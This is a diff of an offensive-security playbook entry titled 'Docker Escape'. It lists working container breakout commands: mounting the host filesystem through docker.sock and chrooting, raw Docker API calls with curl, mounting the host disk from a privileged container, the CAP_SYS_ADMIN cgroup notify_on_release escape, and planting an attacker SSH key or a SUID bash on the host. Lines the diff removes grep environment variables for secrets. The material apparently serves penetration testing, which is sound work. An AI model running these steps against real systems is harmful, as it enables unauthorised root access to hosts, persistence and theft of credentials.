@@ -3,40 +3,51 @@ id: linux-docker-escape
 title: Docker Escape
 stage: privesc
 tags: [linux]
-tools:
-  - find / -name docker.sock 2>/dev/null
-  - docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-  - capsh --print
-leads_to: [root-linux]
-summary: Escape Docker containers via socket access, privileged mode, or exposed capabilities to gain root on the host.
+summary: Break out of a Docker container via the socket, privileged mode, or dangerous capabilities — the socket is the most common and gives full daemon control over the host.
+leads_to:
+  - root-linux
 ---
+
+## Prerequisites
+
+A shell inside a Docker container. Check with `cat /proc/1/cgroup | grep docker` or `ls /.dockerenv`. One of: accessible `/var/run/docker.sock`, `--privileged` flag set, or `CAP_SYS_ADMIN` capability present.
+
+Docker containers share the host kernel, so privileged access within a container often means privileged access to the host. The docker socket is the biggest risk — it gives full daemon API control, letting you spin up a new container that mounts the host filesystem with no restrictions. Privileged containers have all capabilities and device access, making direct host disk mounting trivial.
+
+## Quick Win
+
+> Check for the docker socket first — if accessible, you own the host in one command.
+
+```bash
+ls -la /var/run/docker.sock
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
 
 ## Check if Inside a Container
 
+> Three reliable indicators — any one of these confirms you're in a container.
+
 ```bash
 cat /proc/1/cgroup | grep -i docker
-ls /.dockerenv          # file exists inside containers
-hostname                # often a short hash
+ls /.dockerenv
+hostname   # usually a short hash
 ```
 
-## Docker Socket Escape (Most Common)
+## Docker Socket Escape
 
-If `/var/run/docker.sock` is accessible from inside the container:
+> Full daemon control — mount the host filesystem and chroot to it.
 
 ```bash
-# Check for socket
+# Confirm socket access
 find / -name docker.sock 2>/dev/null
-ls -la /var/run/docker.sock
 
-# Use socket to mount host filesystem
+# Mount host / and chroot — instant root shell on the host
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
-# Now you have a root shell with access to the ENTIRE host filesystem
 ```
 
-If `docker` binary isn't in the container, use raw API calls:
+If `docker` binary isn't in the container, use the raw API:
 
 ```bash
-# Pull and run via curl to the socket
 curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 curl -s -X POST --unix-socket /var/run/docker.sock \
   -H "Content-Type: application/json" \
@@ -46,25 +57,25 @@ curl -s -X POST --unix-socket /var/run/docker.sock \
 
 ## Privileged Container Escape
 
+> All capabilities + device access → mount the host disk and chroot directly.
+
 ```bash
-# Check if privileged
+# Verify privileged (CapEff = all f's)
 cat /proc/self/status | grep CapEff
-# CapEff: 0000003fffffffff  = all capabilities = privileged
 
-capsh --decode=0000003fffffffff   # verify
-
-# Mount host disk and chroot
-fdisk -l                          # find host disk
+# Mount host disk
+fdisk -l
 mkdir /tmp/host && mount /dev/sda1 /tmp/host
 chroot /tmp/host /bin/bash
 ```
 
-## Capability Abuse — CAP_SYS_ADMIN
+## CAP_SYS_ADMIN Escape (cgroup)
+
+> Use the cgroup notify_on_release mechanism to execute a command on the host.
 
 ```bash
 capsh --print | grep sys_admin
 
-# If cap_sys_admin is set, mount procfs and escape via cgroup notify_on_release
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
 mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
@@ -79,21 +90,19 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 ## Writable Host Path Mounts
 
+> If sensitive host directories are bind-mounted, write SSH keys or drop SUID binaries.
+
 ```bash
-# Check mounted volumes
 mount | grep -v "proc\|sys\|dev\|cgroup"
 cat /proc/mounts
 
-# If /etc or other sensitive paths are mounted — write authorized_keys
+# Write authorized_keys to host user home
 echo "ssh-rsa ATTACKER_KEY" >> /mnt/host_home/.ssh/authorized_keys
-# or drop suid binary on host path
+
+# Or drop SUID binary on host path
 cp /bin/bash /mnt/hostpath/bash && chmod +s /mnt/hostpath/bash
 ```
 
-## Notes
+## Leads To
 
-- The docker socket (`/var/run/docker.sock`) gives full daemon control — if accessible, you own the host
-- Privileged containers have all capabilities + device access — immediate escape
-- Check environment variables for API keys and service credentials too (`env | grep -i token\|secret\|key\|pass`)
-- After escape, you're root on the container host — check for other containers to pivot to
-
+Socket escape → chroot to host → root on the host machine → root-linux. Privileged container → same. Host filesystem writable → plant SSH key → SSH directly to host as root. After escaping, enumerate other containers and internal services for additional pivot paths.
